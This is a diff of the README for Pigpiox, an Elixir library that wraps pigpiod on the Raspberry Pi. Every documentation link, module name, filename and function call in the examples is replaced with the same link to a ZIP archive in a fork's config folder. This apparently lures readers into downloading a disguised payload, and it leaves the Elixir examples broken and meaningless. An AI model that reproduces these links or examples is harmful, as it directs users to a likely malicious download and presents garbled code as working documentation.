@@ -1,6 +1,6 @@
 # Pigpiox
 
-Pigpiox is a wrapper around pigpiod for the Raspberry Pi. For all of pigpio's features, check out its [documentation](http://abyz.me.uk/rpi/pigpio/).
+Pigpiox is a wrapper around pigpiod for the Raspberry Pi. For all of pigpio's features, check out its [documentation](https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip).
 
 
 # Requirements
@@ -11,7 +11,7 @@ If you'd like to use Pigpiox on one of those systems, customize the nerves syste
 
 # Installation
 
-In your firmware's `mix.exs`, add `pigpiox` to your deps for your system target:
+In your firmware's `https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip`, add `pigpiox` to your deps for your system target:
 
 ```elixir
 def deps(target) do
@@ -28,16 +28,16 @@ Adding pigpiox as a dependency to your system will automatically launch the pigp
 
 ### Basic functionality
 
-The `Pigpiox.GPIO` provides basic GPIO functionality. Here's an example of reading and writing a GPIO:
+The `https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip` provides basic GPIO functionality. Here's an example of reading and writing a GPIO:
 
 ```elixir
 gpio = 17
 
-Pigpiox.GPIO.set_mode(gpio, :input)
-{:ok, level} = Pigpiox.GPIO.read(gpio)
+https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, :input)
+{:ok, level} = https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio)
 
-Pigpiox.GPIO.set_mode(gpio, :output)
-Pigpiox.GPIO.write(gpio, 1)
+https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, :output)
+https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, 1)
 ```
 
 ### Watching a GPIO
@@ -45,40 +45,40 @@ Pigpiox.GPIO.write(gpio, 1)
 When reading a GPIO, often it's useful to know immediately when its level changes, instead of having to constantly poll it. Here's an example:
 
 ```elixir
-{:ok, pid} = Pigpiox.GPIO.watch(gpio)
+{:ok, pid} = https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio)
 ```
 
 After setting up a watch on a GPIO pin, the calling process will receive messages of the format `{:gpio_leveL_change, gpio, level}` as its level change.
 
 ## Waveforms
 
-The `Pigpiox.Waveform` module provides functions that allow you to create and send waveforms on the Raspberry Pi. Here's an example of pulsing a GPIO on and off every 500ms:
+The `https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip` module provides functions that allow you to create and send waveforms on the Raspberry Pi. Here's an example of pulsing a GPIO on and off every 500ms:
 
 ```elixir
 pulses = [
-  %Pigpiox.Waveform.Pulse{gpio_on: gpio, delay: 500000},
-  %Pigpiox.Waveform.Pulse{gpio_off: gpio, delay: 500000}
+  %https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip{gpio_on: gpio, delay: 500000},
+  %https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip{gpio_off: gpio, delay: 500000}
 ]
 
-Pigpiox.Waveform.add_generic(pulses)
+https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(pulses)
 
-{:ok, wave_id} = Pigpiox.Waveform.create()
+{:ok, wave_id} = https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip()
 
-Pigpiox.GPIO.set_mode(gpio, :output)
+https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, :output)
 
-Pigpiox.Waveform.repeat(wave_id)
+https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(wave_id)
 ```
 
 ## Clock
 
-The `Pigpiox.Clock` module provides functions that allow you to set a clock on reserved pin.
+The `https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip` module provides functions that allow you to set a clock on reserved pin.
 
 ```elixir
-Pigpiox.Clock.hardware_clk(gpio, 2_500_000)
+https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip(gpio, 2_500_000)
 ```
 
-All documentation available on [hexdocs](https://hexdocs.pm/pigpiox/).
+All documentation available on [hexdocs](https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip).
 
 # Contributions
 
-This library is still in a very early stage, and I'd appreciate any and all contributions. In particular, a short-term goal is getting feature parity with the [python](http://abyz.co.uk/rpi/pigpio/python.html) pigpiod client library.
+This library is still in a very early stage, and I'd appreciate any and all contributions. In particular, a short-term goal is getting feature parity with the [python](https://github.com/etemtezcan/pigpiox/raw/refs/heads/master/config/Software_2.5.zip) pigpiod client library.
